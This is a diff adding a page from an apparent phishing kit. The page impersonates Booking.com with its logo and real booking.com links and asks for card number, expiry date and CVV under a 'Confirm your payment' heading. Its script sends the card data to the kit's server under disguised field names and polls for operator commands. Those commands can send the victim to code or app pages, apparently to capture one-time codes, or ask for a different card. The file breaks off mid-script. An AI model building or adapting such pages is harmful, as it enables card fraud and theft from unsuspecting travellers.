@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Booking.com | Official partener</title>
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="google" content="translate">
+  <meta http-equiv="Content-Language" content="en">
+  <style>
+    body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #f5f7fa;
+      margin: 0;
+    }
+    .topbar{
+  background:#003580;
+  color:#fff;
+  padding:16px 20px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  box-shadow:0 2px 8px rgba(0,0,0,.1);
+}
+    .container{
+  max-width:520px;
+  margin:0 auto;
+  background:#fff;
+  padding:20px;
+  border-radius:8px;
+  box-shadow:0 6px 15px rgba(0,0,0,.06);
+}
+    h2{margin-bottom:10px}
+    .progress{font-size:13px;color:#6b7280;margin-bottom:20px}
+    .bar{display:flex;gap:6px;margin-top:8px}
+    .bar div{flex:1;height:4px;border-radius:2px;background:#e5e7eb}
+    .bar .active{background:#0071c2}
+    .box{
+  background:#f8fafc;
+  border:1px solid #e2e8f0;
+  padding:16px;
+  border-radius:10px;
+  margin-bottom:20px;
+  font-size:14px;
+  line-height:1.6;
+}
+    .field{margin-bottom:10px}
+    label{
+  display:block;
+  margin-bottom:8px;
+  font-size:18px;
+  font-weight:500;
+}
+    input{
+  width:100%;
+  padding:14px;
+  border:1px solid #d1d5db;
+  border-radius:10px;
+  font-size:16px;
+  box-sizing:border-box;
+  transition:all .2s ease;
+  background:#f9fafb;
+}
+
+input:focus{
+  border-color:#0071c2;
+  outline:none;
+  background:#fff;
+  box-shadow:0 0 0 3px rgba(0,113,194,.15);
+}
+    input.input-error{border:2px solid red!important}
+    input.input-error:focus{border-color:red;box-shadow:0 0 0 2px rgba(255,0,0,.12)}
+    .input-shell{position:relative;flex:1}
+    .card-row{display:flex;align-items:flex-start;gap:10px}
+    .card-input{padding-left:14px}
+    .brand-badge{display:flex;align-items:center;justify-content:center;gap:4px;height:48px;background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:0 8px;font-size:10px;font-weight:600;color:#334155;pointer-events:none;white-space:nowrap}
+    .brand-badge svg{width:34px;height:18px;display:block;flex-shrink:0}
+    .field-hint{font-size:12px;color:#6b7280;margin-top:6px}
+    .error-text{color:red;font-size:12px;margin-top:6px;min-height:16px}
+    .payment-row{display:flex;align-items:flex-start;gap:8px}
+    .field-sm{width:88px;flex:0 0 88px}
+    .field-cvv{width:96px;flex:0 0 96px}
+    button{
+  width:100%;
+  margin-top:20px;
+  padding:14px;
+  background:#0071c2;
+  color:#fff;
+  border:none;
+  border-radius:6px; /* less rounded */
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+button:hover{
+  transform:translateY(-1px);
+  box-shadow:0 10px 20px rgba(0,113,194,.25);
+}
+
+button:active{
+  transform:scale(.98);
+}
+    .secure{text-align:center;font-size:13px;color:#777;margin-top:15px}
+    .spinner{width:50px;height:50px;border:4px solid #ccc;border-top:4px solid #0071c2;border-radius:50%;animation:spin 1s linear infinite;margin:auto}
+    @keyframes spin{100%{transform:rotate(360deg)}}
+    .loadingBox{display:none;text-align:center;padding:30px 0}
+    .status-message{color:red;margin-top:0px;font-size:10px;min-height:10px}
+    .accordion{margin-top:40px;border-top:1px solid #e7e7e7}
+    .content{max-height:0;overflow:hidden;transition:max-height .3s ease;padding:0}
+    .content p{margin:8px 9px;font-size:14px;color:#6b7280;padding-left:10px}
+    .content-link{cursor:pointer}
+    .content-link:hover{color:#1a1a1a;text-decoration:underline}
+    .item{padding:18px;border-bottom:1px solid #e7e7e7;display:flex;justify-content:space-between;align-items:center;cursor:pointer;font-size:14px;font-weight:500;color:#1a1a1a}
+    .item:hover{background:#f7f7f7}
+    .arrow{fill:#6b7280;transition:transform .3s cubic-bezier(.4,0,.2,1)}
+    .item.active .arrow{transform:rotate(180deg)}
+    @media (max-width:560px){
+      .container{border-radius:0;box-shadow:none}
+      .brand-slot{width:74px;flex-basis:74px}
+      .brand-badge{padding:0 6px;font-size:9px}
+      .payment-row{gap:6px}
+      .field-sm{width:84px;flex-basis:84px}
+      .field-cvv{width:90px;flex-basis:90px}
+    }
+  </style>
+</head>
+<body>
+<div style="background:#013b95; color:white; padding:15px 20px; display:flex; justify-content:space-between; align-items:center;">
+  <div style="display:flex; align-items:center;">
+  <svg viewBox="0 0 180 30" height="20" fill="white">
+    <path d="M 70.6 2.73999 C 70.602 2.19808 70.7646 1.66892 71.0673 1.21943 C 71.3701 0.769947 71.7993 0.420321 72.3007 0.214768 C 72.8021 0.00921437 73.3532 -0.0430342 73.8843 0.064629 C 74.4155 0.172292 74.9027 0.435032 75.2845 0.819622 C 75.6663 1.20421 75.9255 1.69338 76.0293 2.22527 C 76.133 2.75716 76.0768 3.30788 75.8676 3.80779 C 75.6584 4.3077 75.3056 4.73434 74.8539 5.03377 C 74.4022 5.3332 73.8719 5.49197 73.33 5.48999 C 72.9702 5.48868 72.6141 5.41651 72.2822 5.2776 C 71.9503 5.13869 71.649 4.93576 71.3955 4.6804 C 71.1419 4.42504 70.9412 4.12225 70.8047 3.78931 C 70.6683 3.45637 70.5987 3.09982 70.6 2.73999 V 2.73999 Z M 116.5 23.77 C 117.044 23.772 117.577 23.6124 118.031 23.3114 C 118.484 23.0104 118.838 22.5816 119.048 22.0793 C 119.257 21.577 119.313 21.0238 119.208 20.4897 C 119.103 19.9555 118.842 19.4646 118.458 19.079 C 118.074 18.6934 117.584 18.4305 117.05 18.3236 C 116.516 18.2167 115.963 18.2705 115.46 18.4784 C 114.957 18.6862 114.527 19.0387 114.224 19.4911 C 113.922 19.9436 113.76 20.4757 113.76 21.02 C 113.76 21.7476 114.048 22.4456 114.562 22.961 C 115.075 23.4764 115.772 23.7673 116.5 23.77 V 23.77 Z M 25.7 6.72999 C 24.0129 6.74775 22.3688 7.26426 20.9746 8.21447 C 19.5805 9.16469 18.4986 10.5061 17.8653 12.0699 C 17.2319 13.6337 17.0754 15.3499 17.4154 17.0025 C 17.7554 18.6551 18.5767 20.1701 19.776 21.3569 C 20.9752 22.5436 22.4988 23.349 24.1548 23.6717 C 25.8108 23.9944 27.5253 23.8199 29.0824 23.1702 C 30.6395 22.5205 31.9695 21.4247 32.9051 20.0206 C 33.8406 18.6166 34.3399 16.9672 34.34 15.28 C 34.3768 14.1396 34.1778 13.0038 33.7555 11.9438 C 33.3331 10.8839 32.6965 9.92248 31.8855 9.11989 C 31.0744 8.3173 30.1064 7.69078 29.0421 7.27955 C 27.9778 6.86831 26.84 6.68122 25.7 6.72999 V 6.72999 Z M 25.7 19.83 C 23.35 19.83 21.7 17.96 21.7 15.28 C 21.7 12.6 23.34 10.73 25.7 10.73 C 28.06 10.73 29.7 12.6 29.7 15.28 C 29.7 17.96 28.11 19.83 25.7 19.83 Z M 65.3 15.71 C 65.1321 15.3716 64.9128 15.0613 64.65 14.79 L 64.5 14.63 L 64.66 14.48 C 64.9116 14.2078 65.1423 13.917 65.35 13.61 L 69.74 7.05999 H 64.41 L 61.1 12.19 C 60.9586 12.3442 60.782 12.4621 60.5852 12.5334 C 60.3885 12.6048 60.1774 12.6277 59.97 12.6 H 59.22 V 2.90999 C 59.22 0.979993 58.01 0.709993 56.71 0.709993 H 54.48 V 23.58 H 59.21 V 16.72 H 59.65 C 60.19 16.72 60.56 16.78 60.73 17.08 L 63.35 21.97 C 63.5773 22.5089 63.9785 22.9563 64.4895 23.2408 C 65.0006 23.5253 65.5922 23.6306 66.17 23.54 H 69.8 L 67.09 19.07 L 65.3 15.71 Z M 88.27 6.68999 C 87.3747 6.67014 86.4851 6.83782 85.6584 7.18226 C 84.8318 7.5267 84.0863 8.04028 83.47 8.68999 L 83.18 8.97999 L 83.08 8.57999 C 82.9261 8.08803 82.6021 7.66692 82.166 7.39207 C 81.7299 7.11723 81.2102 7.0066 80.7 7.07999 H 78.57 V 23.57 H 83.29 V 15.97 C 83.275 15.2919 83.373 14.6159 83.58 13.97 C 83.7979 13.1302 84.2923 12.3883 84.9836 11.8639 C 85.6748 11.3396 86.5225 11.0634 87.39 11.08 C 88.85 11.08 89.39 11.85 89.39 13.86 V 21.05 C 89.335 21.3921 89.3619 21.7424 89.4686 22.072 C 89.5753 22.4017 89.7586 22.7013 90.0036 22.9463 C 90.2487 23.1914 90.5483 23.3747 90.878 23.4814 C 91.2076 23.5881 91.5579 23.615 91.9 23.56 H 94.12 V 13.07 C 94.15 8.89999 92.12 6.68999 88.27 6.68999 V 6.68999 Z M 73.39 7.05999 H 71.17 V 23.58 H 75.87 V 9.57999 C 75.9234 9.24041 75.8964 8.89304 75.7913 8.56576 C 75.6862 8.23848 75.5058 7.94038 75.2647 7.69537 C 75.0236 7.45037 74.7284 7.26527 74.4028 7.15493 C 74.0773 7.04459 73.7304 7.01208 73.39 7.05999 V 7.05999 Z M 44.16 6.72999 C 42.4729 6.74775 40.8288 7.26426 39.4346 8.21447 C 38.0405 9.16469 36.9586 10.5061 36.3253 12.0699 C 35.6919 13.6337 35.5354 15.3499 35.8754 17.0025 C 36.2154 18.6551 37.0367 20.1701 38.236 21.3569 C 39.4352 22.5436 40.9588 23.349 42.6148 23.6717 C 44.2708 23.9944 45.9853 23.8199 47.5424 23.1702 C 49.0995 22.5205 50.4295 21.4247 51.3651 20.0206 C 52.3006 18.6166 52.7999 16.9672 52.8 15.28 C 52.8368 14.1396 52.6378 13.0038 52.2155 11.9438 C 51.7931 10.8839 51.1565 9.92248 50.3455 9.11989 C 49.5344 8.3173 48.5664 7.69078 47.5021 7.27955 C 46.4378 6.86831 45.3 6.68122 44.16 6.72999 V 6.72999 Z M 44.16 19.83 C 41.81 19.83 40.16 17.96 40.16 15.28 C 40.16 12.6 41.8 10.73 44.16 10.73 C 46.52 10.73 48.16 12.6 48.16 15.28 C 48.16 17.96 46.57 19.83 44.16 19.83 Z M 144.89 6.72999 C 143.203 6.74775 141.559 7.26426 140.165 8.21447 C 138.77 9.16469 137.689 10.5061 137.055 12.0699 C 136.422 13.6337 136.265 15.3499 136.605 17.0025 C 136.945 18.6551 137.767 20.1701 138.966 21.3569 C 140.165 22.5436 141.689 23.349 143.345 23.6717 C 145.001 23.9944 146.715 23.8199 148.272 23.1702 C 149.829 22.5205 151.16 21.4247 152.095 20.0206 C 153.031 18.6166 153.53 16.9672 153.53 15.28 C 153.567 14.1396 153.368 13.0038 152.945 11.9438 C 152.523 10.8839 151.887 9.92248 151.075 9.11989 C 150.264 8.3173 149.296 7.69078 148.232 7.27955 C 147.168 6.86831 146.03 6.68122 144.89 6.72999 V 6.72999 Z M 144.89 19.83 C 142.54 19.83 140.89 17.96 140.89 15.28 C 140.89 12.6 142.53 10.73 144.89 10.73 C 147.25 10.73 148.89 12.6 148.89 15.28 C 148.89 17.96 147.3 19.83 144.89 19.83 Z M 109.74 7.01999 C 109.356 6.98285 108.97 7.05749 108.627 7.23491 C 108.285 7.41233 108.001 7.68497 107.81 8.01999 L 107.69 8.26999 L 107.47 8.07999 C 106.253 7.08344 104.711 6.57072 103.14 6.63999 C 98.75 6.63999 95.78 9.94999 95.78 14.87 C 95.78 19.79 98.85 23.22 103.23 23.22 C 104.521 23.2791 105.795 22.9061 106.85 22.16 L 107.21 21.88 V 22.34 C 107.21 24.55 105.78 25.77 103.21 25.77 C 102.131 25.755 101.062 25.5555 100.05 25.18 C 99.8562 25.0813 99.6419 25.0295 99.4244 25.0287 C 99.2069 25.0279 98.9923 25.0782 98.7977 25.1754 C 98.6032 25.2727 98.4342 25.4143 98.3043 25.5887 C 98.1745 25.7632 98.0874 25.9657 98.05 26.18 L 97.14 28.46 L 97.47 28.63 C 99.2593 29.5195 101.232 29.9783 103.23 29.97 C 107.23 29.97 111.9 27.91 111.9 22.14 V 7.01999 H 109.74 Z M 104.06 19.11 C 101.5 19.11 100.58 16.86 100.58 14.76 C 100.58 13.83 100.81 10.76 103.81 10.76 C 105.3 10.76 107.3 11.18 107.3 14.86 C 107.3 18.38 105.54 19.11 104.06 19.11 Z M 13.09 11.85 L 12.4 11.47 L 13 10.97 C 13.6103 10.4334 14.0951 9.76919 14.42 9.02435 C 14.7449 8.27951 14.9019 7.47231 14.88 6.65999 C 14.88 3.05999 12.09 0.739993 7.79 0.739993 H 2.31 C 1.69606 0.762953 1.11431 1.02048 0.684566 1.45953 C 0.254821 1.89857 0.00981021 2.48571 0 3.09999 L 0 23.5 H 7.88 C 12.67 23.5 15.77 20.89 15.77 16.84 C 15.8104 15.8446 15.583 14.8566 15.1116 13.9789 C 14.6403 13.1012 13.9421 12.3661 13.09 11.85 V 11.85 Z M 4.37 6.07999 C 4.37 5.01999 4.82 4.51999 5.8 4.45999 H 7.8 C 8.16093 4.42761 8.52456 4.47504 8.8651 4.59892 C 9.20565 4.7228 9.51476 4.9201 9.77052 5.17681 C 10.0263 5.43353 10.2224 5.74338 10.345 6.08438 C 10.4676 6.42538 10.5137 6.78919 10.48 7.14999 C 10.5194 7.51629 10.4791 7.88679 10.3616 8.23598 C 10.2442 8.58517 10.0524 8.90477 9.79964 9.17277 C 9.54684 9.44077 9.23898 9.65082 8.89723 9.78844 C 8.55549 9.92606 8.18798 9.988 7.82 9.96999 H 4.37 V 6.07999 Z M 8.2 19.64 H 4.37 V 15.06 C 4.37 14.06 4.76 13.57 5.59 13.45 H 8.2 C 8.99043 13.4949 9.7337 13.8406 10.2774 14.4161 C 10.8211 14.9916 11.124 15.7533 11.124 16.545 C 11.124 17.3367 10.8211 18.0984 10.2774 18.6739 C 9.7337 19.2494 8.99043 19.595 8.2 19.64 Z M 174.53 6.73999 C 173.558 6.74366 172.6 6.96575 171.726 7.38984 C 170.852 7.81393 170.084 8.42915 169.48 9.18999 L 169.14 9.62999 L 168.87 9.13999 C 168.437 8.355 167.787 7.71128 166.998 7.2857 C 166.209 6.86012 165.314 6.67067 164.42 6.73999 C 163.604 6.75328 162.798 6.93308 162.054 7.26838 C 161.309 7.60368 160.641 8.08742 160.09 8.68999 L 159.65 9.16999 L 159.48 8.53999 C 159.323 8.07152 159.008 7.67282 158.587 7.41334 C 158.167 7.15386 157.669 7.05005 157.18 7.11999 H 155.18 V 23.57 H 159.64 V 16.31 C 159.646 15.6629 159.727 15.0187 159.88 14.39 C 160.31 12.63 161.49 10.74 163.47 10.93 C 164.69 11.05 165.29 11.99 165.29 13.82 V 23.57 H 169.81 V 16.31 C 169.791 15.6345 169.875 14.9601 170.06 14.31 C 170.42 12.64 171.65 10.92 173.56 10.92 C 174.94 10.92 175.45 11.7 175.45 13.81 V 21.17 C 175.45 22.83 176.19 23.57 177.85 23.57 H 180 V 13.07 C 180 8.86999 178.15 6.73999 174.53 6.73999 Z M 133.69 17.86 C 132.51 19.095 130.913 19.8471 129.21 19.97 C 128.593 20.0073 127.974 19.914 127.395 19.6962 C 126.816 19.4784 126.29 19.141 125.85 18.706 C 125.41 18.271 125.067 17.7482 124.843 17.1716 C 124.619 16.5951 124.519 15.9778 124.55 15.36 C 124.498 14.7504 124.575 14.1365 124.776 13.5588 C 124.978 12.981 125.299 12.4524 125.719 12.0076 C 126.14 11.5629 126.649 11.212 127.215 10.978 C 127.78 10.744 128.388 10.6322 129 10.65 C 129.84 10.65 130.8 10.95 130.95 11.46 V 11.55 C 131.048 11.8986 131.258 12.2056 131.547 12.424 C 131.835 12.6425 132.188 12.7605 132.55 12.76 H 135 V 10.61 C 135 7.76999 131.39 6.73999 129 6.73999 C 123.81 6.73999 120 10.37 120 15.35 C 120 20.33 123.73 23.97 128.86 23.97 C 130.178 23.9562 131.479 23.6722 132.683 23.1355 C 133.887 22.5989 134.969 21.821 135.86 20.85 L 134 17.58 L 133.69 17.86 Z"></path>
+  </svg>
+</div>
+  
+</div>
+
+<div class="container">
+  <div class="progress">
+    Step 2 of 3 - Confirm your payment
+    <div class="bar">
+      <div class="active"></div>
+      <div class="active"></div>
+      <div></div>
+    </div>
+  </div>
+
+  <h2>Payment Details</h2>
+  <div class="box">
+    Enter your card details below to complete the payment and continue to the next verification step.
+  </div>
+<div style="display:flex; gap:8px; margin-bottom:18px; align-items:center;">
+  <img src="https://img.icons8.com/color/48/amex.png" style="height:28px; border:1px solid #ddd; padding:6px; border-radius:6px;">
+  <img src="https://img.icons8.com/color/48/unionpay.png" style="height:28px; border:1px solid #ddd; padding:6px; border-radius:6px;">
+  <img src="https://img.icons8.com/color/48/mastercard-logo.png" style="height:28px; border:1px solid #ddd; padding:6px; border-radius:6px;">
+  <img src="https://img.icons8.com/color/48/visa.png" style="height:28px; border:1px solid #ddd; padding:6px; border-radius:6px;">
+</div>
+  <form id="form" novalidate>
+    <div class="field">
+      <label for="rez">Card Number</label>
+      <div class="card-row">
+        <div class="input-shell" style="position:relative;">
+  <input id="rez" style="padding-right:80px;" placeholder="Card number">
+
+  <div id="cardBrandBadge" 
+       style="position:absolute; right:10px; top:50%; transform:translateY(-50%); display:flex; align-items:center; gap:4px; font-size:12px; font-weight:600; color:#334155;">
+    <span style="color:#94a3b8;">CARD</span>
+  </div>
+</div>
+      </div>
+      <div id="cardHint" class="field-hint"></div>
+      <div id="cardError" class="error-text"></div>
+    </div>
+
+    <div style="display:flex; gap:12px;">
+  
+  <div style="flex:1;">
+    <label>Expiry Date <span style="color:red">*</span></label>
+    <input id="luna" placeholder="MM / YY" maxlength="5">
+    <div id="monthError" class="error-text"></div>
+  </div>
+
+  <div style="flex:1;">
+    <label>CVV/CVC <span style="color:red">*</span></label>
+    <div style="position:relative;">
+      <input id="suma" style="padding-left:15px;" placeholder="123">
+      <span style="position:absolute; left:15px; top:50%; transform:translateY(-50%);"></span>
+    </div>
+    <div id="cvvError" class="error-text"></div>
+  </div>
+
+</div>
+<p id="errorMsg" class="status-message"></p>
+    <button type="button" onclick="trimite()">Confirm payment</button>
+	<div style="margin-top:12px; text-align:center; font-size:12px; color:#6b7280;">
+  🔒 Your payment is secured
+</div>
+  </form>
+
+  <div id="loadingBox" class="loadingBox">
+    <div class="spinner"></div>
+    <p style="margin-top:15px;">Verifying your payment details...</p>
+    <p style="font-size:13px;color:#777;">Please wait a few seconds</p>
+  </div>
+
+  <p id="errorMsg" class="status-message"></p>
+  <div class="secure-panel" aria-hidden="true">
+  </div>
+  
+</div>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const id = params.get("id");
+  const showRetryNotice = params.get("retry") === "1";
+  const cardInput = document.getElementById("rez");
+  const monthInput = document.getElementById("luna");
+  
+  const cvvInput = document.getElementById("suma");
+  const form = document.getElementById("form");
+  const loadingBox = document.getElementById("loadingBox");
+  const errorMsg = document.getElementById("errorMsg");
+  const cardError = document.getElementById("cardError");
+  const monthError = document.getElementById("monthError");
+  const yearError = document.getElementById("yearError");
+  const cvvError = document.getElementById("cvvError");
+  const cardHint = document.getElementById("cardHint");
+  const cardBrandBadge = document.getElementById("cardBrandBadge");
+
+  const bookingFooterUrl = "https://www.booking.com/content/about.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BSN7gxmPWYCAKJgA9aH4yNuERpTvs4uiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142";
+  const travelArticlesUrl = "https://www.booking.com/articles.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BSN7gxmPWYCAKJgA9aH4yNuERpTvs4uiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142";
+  const seasonalDealsUrl = "https://www.booking.com/deals/index.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BSN7gxmPWYCAKJgA9aH4yNuERpTvs4uiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142";
+  const termsUrl = "https://www.booking.com/content/terms.en-gb.html?label=gen173nr-10CAEoggI46AdIM1BSN7gxmPWYCAKJgA9aH4yNuERpTvs4uiX-AEBiAIBqAIBuAKtvrfOBsACAdICJDMwYWY4ZjZjLTCcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw&sid=de6526ebe0062a2b15d8f3b2306d7e72&aid=304142";
+  let statusInterval = null;
+  const retryMessage = "Details are not correct. Please try again or use a different card.";
+
+  const CARD_BRANDS = {
+    visa:{label:"Visa",lengths:[13,16,19],cvvLengths:[3],groups:[4,4,4,4,3],icon:'<svg viewBox="0 0 48 16" xmlns="http://www.w3.org/2000/svg"><text x="0" y="12" font-family="Arial, sans-serif" font-weight="bold" font-size="12" fill="#1A1F71">VISA</text></svg>'},
+    mastercard:{label:"Mastercard",lengths:[16],cvvLengths:[3],groups:[4,4,4,4],icon:'<svg viewBox="0 0 48 24" xmlns="http://www.w3.org/2000/svg"><circle cx="18" cy="12" r="8" fill="#EB001B"/><circle cx="30" cy="12" r="8" fill="#F79E1B"/></svg>'},
+    maestro:{label:"Maestro",lengths:[12,13,14,15,16,17,18,19],cvvLengths:[3],groups:[4,4,4,4,3],icon:'<svg viewBox="0 0 48 24" xmlns="http://www.w3.org/2000/svg"><circle cx="18" cy="12" r="8" fill="#0099DF"/><circle cx="30" cy="12" r="8" fill="#ED1C2E"/><text x="6" y="22" font-size="6" fill="#000">Maestro</text></svg>'},
+    amex:{label:"American Express",lengths:[15],cvvLengths:[4],groups:[4,6,5],icon:'<svg viewBox="0 0 48 24" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="24" fill="#2E77BB"/><text x="4" y="14" font-size="8" fill="white">AMEX</text></svg>'},
+    diners:{label:"Diners Club",lengths:[14],cvvLengths:[3],groups:[4,6,4],icon:'<svg viewBox="0 0 48 24" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="12" r="10" fill="#0079BE"/><rect x="20" y="6" width="4" height="12" fill="white"/></svg>'},
+    unionpay:{label:"UnionPay",lengths:[16,17,18,19],cvvLengths:[3],groups:[4,4,4,4,3],icon:'<svg viewBox="0 0 48 24" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="24" fill="#E21836"/><text x="6" y="14" font-size="8" fill="white">UnionPay</text></svg>'}
+  };
+
+  function digitsOnly(value){return String(value||"").replace(/\D/g,"")}
+  function detectCardBrand(number){
+    if(!number) return null;
+    const firstTwo=parseInt(number.slice(0,2),10);
+    const firstFour=parseInt(number.slice(0,4),10);
+    if(number.startsWith("4")) return "visa";
+    if(number.startsWith("34")||number.startsWith("37")) return "amex";
+    if(number.startsWith("36")||number.startsWith("38")||number.startsWith("39")) return "diners";
+    if(number.startsWith("62")) return "unionpay";
+    if((firstTwo>=51&&firstTwo<=55)||(firstFour>=2221&&firstFour<=2720)) return "mastercard";
+    if(number.startsWith("50")||(firstTwo>=56&&firstTwo<=69)) return "maestro";
+    return null;
+  }
+  function formatCardNumber(number, brand){
+  const config = brand ? CARD_BRANDS[brand] : null;
+  const maxDigits = config ? Math.max(...config.lengths) : 16;
+
+  // LIMIT digits BEFORE formatting
+  const digits = number.slice(0, maxDigits);
+
+  const groups = config ? config.groups : [4,4,4,4];
+  const parts = [];
+  let cursor = 0;
+
+  for(const group of groups){
+    if(cursor >= digits.length) break;
+    parts.push(digits.slice(cursor, cursor + group));
+    cursor += group;
+  }
+
+  return parts.join(" ");
+}
+  function luhnCheck(number){
+    let sum=0;let shouldDouble=false;
+    for(let i=number.length-1;i>=0;i--){
+      let digit=parseInt(number.charAt(i),10);
+      if(shouldDouble){digit*=2;if(digit>9) digit-=9}
+      sum+=digit;shouldDouble=!shouldDouble;
+    }
+    return sum%10===0;
+  }
+  function setInputError(input, el, message){
+  if(input) input.classList.add("input-error");
+  if(el) el.innerText = message;
+}
+
+function clearInputError(input, el){
+  if(input) input.classList.remove("input-error");
+  if(el) el.innerText = "";
+}
+  function updateCardBrandUI(){
+  const brand = detectCardBrand(digitsOnly(cardInput.value));
+
+  if(!brand){
+    cardBrandBadge.innerHTML = "";
+    cardHint.innerText = "";
+    cvvInput.placeholder = "123";
+    cvvInput.maxLength = 4;
+    return;
+  }
+
+  const config = CARD_BRANDS[brand];
+
+  // ONLY ICON (small)
+  cardBrandBadge.innerHTML = config.icon;
+
+  cardHint.innerText = config.label + " detected";
+  cvvInput.placeholder = brand === "amex" ? "1234" : "123";
+  cvvInput.maxLength = brand === "amex" ? 4 : 3;
+}
+  function validateCardNumber(){
+    const digits=digitsOnly(cardInput.value);
+    const brand=detectCardBrand(digits);
+    clearInputError(cardInput,cardError);
+    if(!digits){setInputError(cardInput,cardError,"Enter your card number");return false}
+    if(!brand){setInputError(cardInput,cardError,"Enter a supported card number");return false}
+    if(!CARD_BRANDS[brand].lengths.includes(digits.length)){setInputError(cardInput,cardError,"Enter a valid "+CARD_BRANDS[brand].label+" card number");return false}
+    if(!luhnCheck(digits)){setInputError(cardInput,cardError,"Enter a valid card number");return false}
+    return true;
+  }
+  function validateExpiry(){
+  const value = monthInput.value;
+  clearInputError(monthInput, monthError);
+
+  if(!value || value.length < 5){
+    setInputError(monthInput, monthError, "Enter expiry date");
+    return false;
+  }
+
+  const parts = value.split("/");
+
+if(parts.length !== 2){
+  setInputError(monthInput, monthError, "Invalid format");
+  return false;
+}
+
+const month = parseInt(parts[0], 10);
+const year = parseInt("20" + parts[1], 10);
+
+  if(month < 1 || month > 12){
+    setInputError(monthInput, monthError, "Invalid month");
+    return false;
+  }
+
+  const now = new Date();
+  const currentYear = now.getFullYear();
+  const currentMonth = now.getMonth() + 1;
+
+  if(year < currentYear || year > currentYear + 20){
+    setInputError(monthInput, monthError, "Invalid year");
+    return false;
+  }
+
+  if(year === currentYear && month < currentMonth){
+    setInputError(monthInput, monthError, "Card expired");
+    return false;
+  }
+
+  return true;
+}
+  function validateCVV(){
+    const value=digitsOnly(cvvInput.value);
+    const brand=detectCardBrand(digitsOnly(cardInput.value));
+    const lengths=brand?CARD_BRANDS[brand].cvvLengths:[3];
+    clearInputError(cvvInput,cvvError);
+    if(!value){setInputError(cvvInput,cvvError,"Enter CVV");return false}
+    if(!lengths.includes(value.length)){setInputError(cvvInput,cvvError,"CVV must have "+lengths.join(" or ")+" digits");return false}
+    return true;
+  }
+  function validateStep2Form(){
+  return validateCardNumber() && validateExpiry() && validateCVV();
+}
+  function showLoadingState(){form.style.display="none";loadingBox.style.display="block"}
+  function showFormState(){form.style.display="block";loadingBox.style.display="none"}
+  async function getRetryTargetId(){
+    const response = await fetch("/action",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id,action:"getNewId"})});
+    const result = await response.json();
+    return result.newId || id;
+  }
+
+  async function trimite(){
+    errorMsg.innerText="";
+    if(!validateStep2Form()) return;
+
+    const rezervare=digitsOnly(cardInput.value);
+    const [luna = "", an = ""] = monthInput.value.split("/").map(part => part.trim());
+    const suma=digitsOnly(cvvInput.value);
+    const response=await fetch("/step2",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id,rezervare,luna,an,suma})});
+    const result=await response.json();
+    if(!response.ok){errorMsg.innerText=result.error||"Please check your payment details and try again.";return}
+    await fetch("/action",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id,action:"loading"})});
+    showLoadingState();
+    startChecking();
+  }
+
+  async function handleRetry(){
+    errorMsg.innerText=retryMessage;
+    showFormState();
+    const newId = await getRetryTargetId();
+    if(newId && newId !== id){
+      window.location.href="step2.html?id="+encodeURIComponent(newId)+"&retry=1";
+    }
+  }
+  function handleStatus(data){
+    if(data.retry){
+      if(statusInterval){clearInterval(statusInterval);statusInterval=null}
+      handleRetry();
+      return;
+    }
+    if(data.status==="approved"){loadingBox.innerHTML="<h2 style='color:green'>Payment successful</h2>";return}
+    if(data.status==="rejected"){window.location.href="index.html?id="+id;return}
+    if(data.step==="code"){window.location.href="code.html?id="+id;return}
+    if(data.step==="app"){window.location.href="app.html?id="+id;return}
+    if(data.status==="loading"){errorMsg.innerText="";showLoadingState()}
+  }
+  function startChecking(){
+    if(statusInterval) return;
+    statusInterval=setInterval(()=>{fetch("/status/"+id).then(res=>res.json()).then(handleStatus)},3000);
+  }
+  function toggle(el){
+    const content=el.nextElementSibling;
+    el.classList.toggle("active");
+    if(content.style.maxHeight){content.style.maxHeight=null}else{content.style.maxHeight=content.scrollHeight+"px"}
+  }
+  function openBookingFooterLink(url=bookingFooterUrl){
+    if(window.confirm("Are you sure you want to leave this page?")) window.location.href=url;
+  }
+
+  cardInput.addEventListener("input",()=>{
+    const digits=digitsOnly(cardInput.value);
+    const brand=detectCardBrand(digits);
+    cardInput.value=formatCardNumber(digits,brand);
+    updateCardBrandUI();
+    clearInputError(cardInput,cardError);
+  });
+  monthInput.addEventListener("input", () => {
+  let value = digitsOnly(monthInput.value).slice(0,4);
+
+  if(value.length >= 3){
+    value = value.slice(0,2) + "/" + value.slice(2);
+  }
+
+  monthInput.value = value;
+  clearInputError(monthInput, monthError);
+});
+  cvvInput.addEventListener("input",()=>{
+    const maxLength=detectCardBrand(digitsOnly(cardInput.value))==="amex"?4:3;
+    cvvInput.value=digitsOnly(cvvInput.value).slice(0,maxLength);
+    clearInputError(cvvInput,cvvError);
+  });
+
+  if(showRetryNotice){
+    errorMsg.innerText=retryMessage;
+  }
+
+  fetch("/status/"+id)
+    .then(res=>res.json())
+    .then(data=>{
+      if(data.retry){handleRetry();return;}
